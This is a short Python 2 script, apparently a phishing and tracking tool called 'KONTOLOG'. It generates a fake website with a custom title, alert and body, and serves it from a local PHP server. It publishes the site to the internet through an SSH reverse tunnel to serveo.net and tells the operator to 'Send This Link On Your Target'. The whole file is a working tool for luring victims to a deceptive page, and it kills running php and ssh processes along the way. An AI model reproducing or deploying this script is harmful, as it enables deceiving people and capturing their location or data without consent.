# KONTOLOG by Deray
import os
import sys
import time
import requests
import subprocess as kontol
from data import site
os.system("killall php;killall ssh;clear")
if os.path.exists("geo/index.php"):
	print "[+] File index.php was found in geo/index.php"
	r=raw_input("[?] Did u want to edit site? y/n: ")
	if r.lower() == "y":
		a=raw_input("[+] Site Name  : ")
		c=raw_input("[+] HTML Title : ")
		b=raw_input("[+] Alert Msg  : ")
		d=raw_input("[+] HTML Body  : ")
		site.m(c,b,d)
		print "[+] Please Wait Creating Fake Websites .."
		with open("data/log.txt","w") as memek:
			kontol.Popen(
				["php","-S","localhost:8080","-t","geo"],
				stderr=kontol.PIPE,stdin=memek,stdout=memek
			)
			time.sleep(3)
			print "[+] Open New Tab And Run listening.py"
			print "[+] Send This Link On Your Target ."
			os.system(
				"ssh -R {}.serveo.net:80:localhost:8080 serveo.net".format(
			a))
	else:
		a=raw_input("[+] Site Name  : ")
		with open("data/log.txt","w") as memek:
			kontol.Popen(
				["php","-S","localhost:8080","-t","geo"],
				stderr=kontol.PIPE,stdin=memek,stdout=memek
			)
			time.sleep(3)
			print "[+] Open New Tab And Run listening.py"
			print "[+] Send This Link On Your Target ."
			os.system(
				"ssh -R {}.serveo.net:80:localhost:8080 serveo.net".format(
			a))
os.system("killall php;killall ssh")